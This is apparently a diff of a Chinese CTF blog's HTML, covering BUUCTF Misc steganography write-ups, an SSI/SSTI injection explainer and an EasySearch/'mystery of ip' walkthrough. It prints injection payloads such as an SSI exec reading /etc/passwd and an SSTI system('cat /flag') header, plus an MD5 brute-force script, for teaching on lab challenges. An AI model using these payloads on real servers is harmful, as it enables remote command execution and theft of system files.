src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/7.png" class title="Da4er"></p>
+<p>binwalk分析一下发现里面有个压缩包，再用foremost分离出来，发现gif有秘密，爆破一下。</p>
+<img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/3.png" class title="Da4er">
+<img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/4.png" class title="Da4er">
+<img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/5.png" class title="Da4er">
+<p>分析gif图片，在第310帧发现假的flag，再用Stegsolve工具分析各个颜色通道，得到flag。</p>
+<img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/6.png" class title="Da4er">
+<img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/7.png" class title="Da4er">
+
+
 <hr>
-<h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><p>二维码被撕碎了，只能用ps拼接，拼接完扫描得到flag。<br><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/8.png" class title="Da4er"></p>
+<h3 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h3><p>二维码被撕碎了，只能用ps拼接，拼接完扫描得到flag。</p>
+<img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/8.png" class title="Da4er">
+
 <hr>
-<h3 id="小易的u盘"><a href="#小易的u盘" class="headerlink" title="小易的u盘"></a>小易的u盘</h3><p>binwalk分离出两个压缩包<br><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/9.png" class title="Da4er"><br>打开发现有很多exe文件，分析exe文件发现有个exe文件的创造时间不同，直接用ida反编译这个文件，便可得到flag。<br><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/10.png" class title="Da4er"><br><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/11.png" class title="Da4er"></p>
+<h3 id="小易的u盘"><a href="#小易的u盘" class="headerlink" title="小易的u盘"></a>小易的u盘</h3><p>binwalk分离出两个压缩包</p>
+<img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/9.png" class title="Da4er">
+<p>打开发现有很多exe文件，分析exe文件发现有个exe文件的创造时间不同，直接用ida反编译这个文件，便可得到flag。</p>
+<img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/10.png" class title="Da4er">
+<img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/11.png" class title="Da4er">
+
 <hr>
-<h3 id="黑客帝国"><a href="#黑客帝国" class="headerlink" title="黑客帝国"></a>黑客帝国</h3><p>题目是个txt文件，打开发现rar文件头，在winhex里直接hex转ascii查看。<br><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/12.png" class title="Da4er"><br>保存为压缩包，有秘密爆破一下。<br><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/13.png" class title="Da4er"><br>解压后发现一个损坏的png图片，查看一下16进制发现是jpg的图片，直接将png的文件头改成jpg文件头，便可得到flag。<br><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/14.png" class title="Da4er"></p>
+<h3 id="黑客帝国"><a href="#黑客帝国" class="headerlink" title="黑客帝国"></a>黑客帝国</h3><p>题目是个txt文件，打开发现rar文件头，在winhex里直接hex转ascii查看。</p>
+<img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/12.png" class title="Da4er">
+<p>保存为压缩包，有秘密爆破一下。</p>
+<img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/13.png" class title="Da4er">
+<p>解压后发现一个损坏的png图片，查看一下16进制发现是jpg的图片，直接将png的文件头改成jpg文件头，便可得到flag。</p>
+<img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/14.png" class title="Da4er">
 <img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/15.png" class title="Da4er">
 <hr>
-<h3 id="真的很杂"><a href="#真的很杂" class="headerlink" title="真的很杂"></a>真的很杂</h3><p>foremost出来一个压缩包，打开压缩包发现是apk文件，直接改后缀名，然后用jadx工具反编译一下，便可得到flag。<br><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/16.png" class title="Da4er"><br><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/17.png" class title="Da4er"><br><img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/18.png" class title="Da4er"></p>
+<h3 id="真的很杂"><a href="#真的很杂" class="headerlink" title="真的很杂"></a>真的很杂</h3><p>foremost出来一个压缩包，打开压缩包发现是apk文件，直接改后缀名，然后用jadx工具反编译一下，便可得到flag。</p>
+<img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/16.png" class title="Da4er">
+<img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/17.png" class title="Da4er">
+<img src="/2-13-BUUCTF-Misc-john-in-the-middle-%E8%B0%81%E8%B5%A2%E4%BA%86%E6%AF%94%E8%B5%9B-%E4%BA%8C%E7%BB%B4%E7%A0%81-%E5%B0%8F%E6%98%93%E7%9A%84U%E7%9B%98-%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD-%E7%9C%9F%E7%9A%84%E5%BE%88%E6%9D%82/18.png" class title="Da4er">
 
           
         
@@ -1900,16 +2166,18 @@
       
         
           
-            <p><script type="text/javascript" src="/js/src/bai.js"></script></p>
+            <script type="text/javascript" src="/js/src/bai.js"></script>
 <h3 id="一-SSI漏洞解析"><a href="#一-SSI漏洞解析" class="headerlink" title="一.SSI漏洞解析"></a>一.SSI漏洞解析</h3><h4 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h4><p>现在大多数Web服务很少用到SSI，但是还是有有必要了解一下。<br><strong>SSI全称是Server Side Includes，即服务器端包含，是一种基于服务器端的网页制作技术。</strong></p>
 <p><strong>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</strong></p>
 <p><strong>基本原理就是：SSI在HTML文件中，可以通过注释行调用命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</strong></p>
 <p>SSI漏洞存在于shtml，stm，shtm文件中，就是应用ssi技术的html文件，当我在这个页面加入ssi指令后，服务器开始解析，将文件图片包含或者远程执行命令。</p>
 <hr>
-<h4 id="2-开启ssi"><a href="#2-开启ssi" class="headerlink" title="2.开启ssi"></a>2.开启ssi</h4><h5 id="1-Nginx"><a href="#1-Nginx" class="headerlink" title="(1)Nginx"></a>(1)Nginx</h5><p>在配置文件中添加如下几项：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssi on;</span><br><span class="line">ssi_silent_errors off;</span><br><span class="line">ssi_types text&#x2F;shtml;</span><br></pre></td></tr></table></figure></p>
+<h4 id="2-开启ssi"><a href="#2-开启ssi" class="headerlink" title="2.开启ssi"></a>2.开启ssi</h4><h5 id="1-Nginx"><a href="#1-Nginx" class="headerlink" title="(1)Nginx"></a>(1)Nginx</h5><p>在配置文件中添加如下几项：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssi on;</span><br><span class="line">ssi_silent_errors off;</span><br><span class="line">ssi_types text&#x2F;shtml;</span><br></pre></td></tr></table></figure>
 <h5 id="2-Apache"><a href="#2-Apache" class="headerlink" title="(2)Apache"></a>(2)Apache</h5><p>修改Apache配置文件httpd.conf：</p>
 <ul>
-<li>确认加载include.so模块，将注释去掉：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule include_module libexec&#x2F;apache2&#x2F;mod_include.so</span><br></pre></td></tr></table></figure></li>
+<li><p>确认加载include.so模块，将注释去掉：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LoadModule include_module libexec&#x2F;apache2&#x2F;mod_include.so</span><br></pre></td></tr></table></figure></li>
 <li><p>AddType部分去掉这两段注释：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">AddType text&#x2F;html .shtml</span><br><span class="line">AddOutputFilter INCLUDES .shtml</span><br></pre></td></tr></table></figure>
 </li>
@@ -1925,11 +2193,12 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">本文档名称：&lt;!--#echo var&#x3D;&quot;DOCUMENT_NAME&quot;--&gt;</span><br><span class="line">现在时间：&lt;!--#echo var&#x3D;&quot;DATE_LOCAL&quot;--&gt;</span><br><span class="line">显示IP地址：&lt;!--#echo var&#x3D;&quot;REMOTE_ADDR&quot;--&gt;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>将文本内容直接插入到文档中&lt;#include&gt;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#include file&#x3D;&quot;文件名称&quot;--&gt;</span><br><span class="line">&lt;!--#include virtual&#x3D;&quot;index.html&quot; --&gt;</span><br><span class="line">&lt;!--#include virtual&#x3D;&quot;文件名称&quot;–&gt;</span><br><span class="line">&lt;!--#include virtual&#x3D;&quot;&#x2F;www&#x2F;footer.html&quot; --&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#include file&#x3D;&quot;文件名称&quot;--&gt;</span><br><span class="line">&lt;!--#include virtual&#x3D;&quot;index.html&quot; --&gt;</span><br><span class="line">&lt;!--#include virtual&#x3D;&quot;文件名称&quot;–&gt;</span><br><span class="line">&lt;!--#include virtual&#x3D;&quot;&#x2F;www&#x2F;footer.html&quot; --&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
 <p><strong>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径。</strong></p>
-</li>
-<li><p>直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;命令&quot;--&gt;</span><br><span class="line">&lt;!--#exec cmd&#x3D;&quot;cat &#x2F;etc&#x2F;passwd&quot;--&gt;</span><br><span class="line">&lt;!--#exec cgi&#x3D;&quot;文件名称&quot;--&gt;</span><br><span class="line">&lt;!--#exec cgi&#x3D;&quot;&#x2F;cgi-bin&#x2F;access_log.cgi&quot;--&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;命令&quot;--&gt;</span><br><span class="line">&lt;!--#exec cmd&#x3D;&quot;cat &#x2F;etc&#x2F;passwd&quot;--&gt;</span><br><span class="line">&lt;!--#exec cgi&#x3D;&quot;文件名称&quot;--&gt;</span><br><span class="line">&lt;!--#exec cgi&#x3D;&quot;&#x2F;cgi-bin&#x2F;access_log.cgi&quot;--&gt;</span><br></pre></td></tr></table></figure>
+
 </li>
 </ul>
 <hr>
@@ -1942,196 +2211,22 @@
 <hr>
 <h3 id="二-SSTI漏洞"><a href="#二-SSTI漏洞" class="headerlink" title="二.SSTI漏洞"></a>二.SSTI漏洞</h3><h4 id="1-原理-1"><a href="#1-原理-1" class="headerlink" title="(1)原理"></a>(1)原理</h4><p>服务端模板注入是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p>
 <hr>
-<h4 id="2-利用"><a href="#2-利用" class="headerlink" title="(2)利用"></a>(2)利用</h4><p> 检测方法如下：<br><img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/1.png" class title="Da4er"><br> 当我们输入的内容，经过web模板解析后返回到html页面中，如果在web模板解析时没有进行很好的过滤就会出现SSTI模板注入漏洞。</p>
-<p>以BUU上[护网杯 2018]easy_tornado为例，当我们的filname和filehash不一样的时候会跳转到error页面。<br><img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/2.png" class title="Da4er"><br><img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/3.png" class title="Da4er"><br> 当我们输入2不会返回正常的1 * 2而是ORZ<br><img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/4.png" class title="Da4er"><br> 证明存在SSTI漏洞<br> 使用python web模板tornado中的handler.settings可以把cookie输出<br><img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/5.png" class title="Da4er"><br> 这就可以证明有SSTI模板漏洞，这个漏洞在很多语言的web模板中都存在，不光只有python，因为python tornado模板使用简单，所以造成的危害更大些。</p>
-<p> 也可以使用system函数执行系统命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;system(&#39;命令&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><br>例题：[BJDCTF2020]The mystery of ip<br>题目X-Forwarded-For可控，存在模板注入，可以使用system执行系统命令。<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For &#123;&#123;system(&#39;cat &#x2F;flag&#39;)&#125;&#125;</span><br></pre></td></tr></table></figure><br><img src="/2-12-%E6%B5%85%E8%B0%88SSI%E5%92%8CSSTI%E6%BC%8F%E6%B4%9E/6.png" class title="Da4er"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://da4er.top/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip.html">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Da4er's">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/3.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Da4er's Blogs">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip.html" itemprop="url">2.12 [BJDCTF2020]EasySearch&The mystery of ip</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-12T16:18:45+08:00">
-                2020-02-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index">
-                    <span itemprop="name">CTF</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip.html" class="leancloud_visitors" data-flag-title="2.12 [BJDCTF2020]EasySearch&The mystery of ip">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  437
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><script type="text/javascript" src="/js/src/bai.js"></script></p>
-<h3 id="EasySearch"><a href="#EasySearch" class="headerlink" title="EasySearch"></a>EasySearch</h3><p>打开题目先随便输入，发现会弹框。在扫描一下目录，发现.swp备份文件。<br><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/1.png" class title="Da4er"><br>打开index.php.swp页面：<br><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/2.png" class title="Da4er"><br>阅读这段源码：<strong>首先是随机获取文件名的一个函数，最关键的是让password前6个字符的md5加密值等于6d0bc1，然后会在public目录下创建一个shtml文件，再将post传参的username字段写入这个shtml文件中。</strong><br>首先写个脚本让password前6个字符的md5值等于6d0bc1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">a&#x3D; &quot;0123456789&quot;</span><br><span class="line">for o in a:</span><br><span class="line">    for p in a:</span><br><span class="line">        for q in a:</span><br><span class="line">            for r in a:</span><br><span class="line">                for s in a:</span><br><span class="line">                    for t in a:</span><br><span class="line">                        for u in a:</span><br><span class="line">                            b &#x3D; str(o)+str(p)+str(q)+str(r)+str(s)+str(t)+str(u)</span><br><span class="line">                            md5 &#x3D; hashlib.md5(b.encode(&#39;utf-8&#39;)).hexdigest()</span><br><span class="line">                            if ((md5[0:6])&#x3D;&#x3D;&#39;6d0bc1&#39;):</span><br><span class="line">                                print b</span><br></pre></td></tr></table></figure><br>可以爆破出很多，我拿<strong>2020666来进行传参。</strong><br><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/3.png" class title="Da4er"><br>成功利用，然后就是访问这个新建的shtml文件了，<strong>抓包发现在响应包中有这个文件的路径</strong>：<br><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/4.png" class title="Da4er"><br><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/5.png" class title="Da4er"><br>到这利用了SSI注入漏洞，所以我们可以在username变量中传入ssi语句来远程执行系统命令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd&#x3D;&quot;命令&quot;--&gt;</span><br></pre></td></tr></table></figure><br>首先ls一下当前目录：<br><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/6.png" class title="Da4er"><br>发现成功利用，没有进行任何过滤。<br>然后我们在ls一下上一级目录：<br><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/7.png" class title="Da4er"><br>发现了 <strong>‘flag_990c66bf85a09c664f0b6741840499b2’</strong> 文件，最后我们把这个文件cat出来，遍得到flag。<br><img src="/2-12-BJDCTF2020-EasySearch-The-mystery-of-ip/8.png" class title="Da4er"></p>
-<hr>
